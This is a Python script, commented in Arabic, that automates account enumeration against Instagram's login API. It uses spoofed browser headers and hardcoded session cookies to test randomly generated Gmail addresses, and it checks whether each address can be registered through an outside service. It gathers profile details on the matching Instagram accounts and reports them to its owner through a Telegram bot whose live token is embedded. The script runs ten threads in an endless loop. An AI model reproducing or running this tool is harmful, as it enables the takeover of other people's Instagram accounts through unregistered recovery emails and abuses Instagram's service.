import requests
import json
import time
from user_agent import generate_user_agent
import random
import telebot
import threading
import pyfiglet
from colorama import Fore, init

init(autoreset=True)

# إعداد البوت
tok = "7442113281:AAF7i4zBUBvm7_yHwBHZm9QmPZ3T6U8t_6I"
bot = telebot.TeleBot(tok)
user_id = "5583353259"  # معرف المالك

# إعداد الطباعة
ascii_banner = pyfiglet.figlet_format("S1")
print(Fore.CYAN + ascii_banner)

# الإحصائيات
gg = 0
bb = 0
gi = 0
bag = 0

# الدالة الأساسية لمحاولات تسجيل الدخول
def s1():
    global gg, bb, gi, bag
    email = "".join(random.choice("qwertyuiopasdfghjklzxcvbnm1234567890") for i in range(9)) + "@gmail.com"
    cookies = {
        'csrftoken': 'tsmei0Vp9gnrZuSLEMBBRE',
        'mid': 'ZxLivAABAAFeyswULOM-bw8zj94N',
        'datr': 'vOISZ-2CwOzuLK0cQgJS2ghf',
        'ig_did': '03666227-B481-45D2-A911-B0A112E356B8',
        'ig_nrcb': '1',
        'dpr': '2.1988937854766846',
        'wd': '891x904',
    }
    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/login/?source=auth_switcher',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'user-agent': str(generate_user_agent()),
        'x-csrftoken': 'tsmei0Vp9gnrZuSLEMBBRE',
        'x-ig-app-id': '936619743392459',
        'x-instagram-ajax': '1017480398',
        'x-requested-with': 'XMLHttpRequest',
    }
    tim = str(time.time()).split(".")[0]
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:oskskssisia',
        'loginAttemptSubmissionCount': '0',
        'optIntoOneTap': 'false',
        'queryParams': '{"source":"auth_switcher"}',
        'trustedDeviceRecords': '{}',
        'username': email,
    }

    response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
    try:
        response_json = response.json()
        if response_json.get("user") and not response_json.get("authenticated") and response_json.get("status") == "ok":
            gi += 1
            g = requests.get(f'https://check-gmail.up.railway.app/checkgmail/email={email}').text
            if '"result":"Good"' in g:
                try:
                    user = email.split("@")[0]
                    r = requests.get(f'https://api-v2.nextcounts.com/api/instagram/user/{user}').json()
                    user = r['username']
                    nic = r['nickname']
                    user_id_instagram = r['id2']
                    priv = r['private']
                    fols = r['followers']
                    foln = r['following']
                    post = r['posts']
                    bot.send_message(user_id, f"""
                    | User: {user} |
                    | Nickname: {nic} |
                    | ID: {user_id_instagram} |
                    | Private: {priv} |
                    | Followers: {fols} |
                    | Following: {foln} |
                    | Posts: {post} |
                    """)
                    gg += 1
                except Exception as e:
                    bot.send_message(user_id, f"Error with {email}: {str(e)}")
            else:
                bag += 1
        else:
            bb += 1
    except json.JSONDecodeError:
        print(Fore.RED + "Error decoding the response as JSON")

    # طباعة الإحصائيات بدون مسح الشاشة
    print(f"""
    {Fore.GREEN}GOOD INSTA AND BAD GMAIL ~ {bag}
    {Fore.BLUE}GOOD ~ {gg}
    {Fore.RED}BAD ~ {bb}
    """)

    time.sleep(random.uniform(1, 3))

# تشغيل المحاولات في عدة خيوط
def run_threads():
    threads = []
    for _ in range(10):  # عدد الخيوط
        t = threading.Thread(target=s1)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

# بدء تشغيل البوت
def start_bot():
    bot.polling(non_stop=True)

if __name__ == "__main__":
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.start()

    # تشغيل المحاولات بشكل مستمر
    while True:
        run_threads()
        time.sleep(1)  # تأخير بسيط بين الدورات لتقليل الحمل